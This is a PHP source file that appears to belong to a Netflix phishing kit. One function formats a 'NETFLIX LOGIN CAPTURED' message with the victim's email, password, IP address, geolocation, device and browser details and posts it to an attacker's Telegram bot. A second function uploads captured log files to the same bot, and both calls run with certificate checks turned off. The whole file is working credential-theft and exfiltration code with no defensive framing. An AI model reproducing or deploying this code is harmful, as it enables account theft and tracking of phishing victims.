<?php
function sendToTelegram($data) {
    $botToken = TELEGRAM_BOT_TOKEN;
    $chatId = TELEGRAM_CHAT_ID;
    
    // Format the message
    $message = "🔔 *NETFLIX LOGIN CAPTURED* 🔔\n\n";
    $message .= "📧 *Email:* `" . $data['email'] . "`\n";
    $message .= "🔑 *Password:* `" . $data['password'] . "`\n";
    $message .= "🌍 *IP:* `" . $data['ip'] . "`\n";
    $message .= "📍 *Location:* " . $data['location']['city'] . ", " . $data['location']['country'] . "\n";
    $message .= "📱 *Device:* " . $data['user_agent'] . "\n";
    $message .= "🖥️ *Screen:* " . $data['screen_resolution'] . "\n";
    $message .= "🗺️ *Timezone:* " . $data['timezone'] . "\n";
    $message .= "⏰ *Time:* " . $data['timestamp'] . "\n";
    $message .= "🔗 *Referrer:* " . $data['referrer'] . "\n";
    
    // Additional info
    $message .= "\n📊 *Additional Info:*\n";
    $message .= "Language: " . $data['language'] . "\n";
    $message .= "Platform: " . $data['platform'] . "\n";
    $message .= "Cookies: " . $data['cookies_enabled'] . "\n";
    $message .= "Do Not Track: " . $data['do_not_track'] . "\n";
    
    // Send location on map
    $lat = $data['location']['latitude'];
    $lon = $data['location']['longitude'];
    
    if ($lat != 0 && $lon != 0) {
        $location_url = "https://maps.google.com/maps?q=$lat,$lon";
        $message .= "\n🗺️ [View on Google Maps]($location_url)";
    }
    
    // Send to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $postData = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => false
    );
    
    // Use cURL to send the request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// Function to send file
function sendFileToTelegram($file_path) {
    $botToken = TELEGRAM_BOT_TOKEN;
    $chatId = TELEGRAM_CHAT_ID;
    
    $url = "https://api.telegram.org/bot$botToken/sendDocument";
    
    $postData = array(
        'chat_id' => $chatId,
        'document' => new CURLFile(realpath($file_path)),
        'caption' => '📁 Log file backup'
    );
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}
?>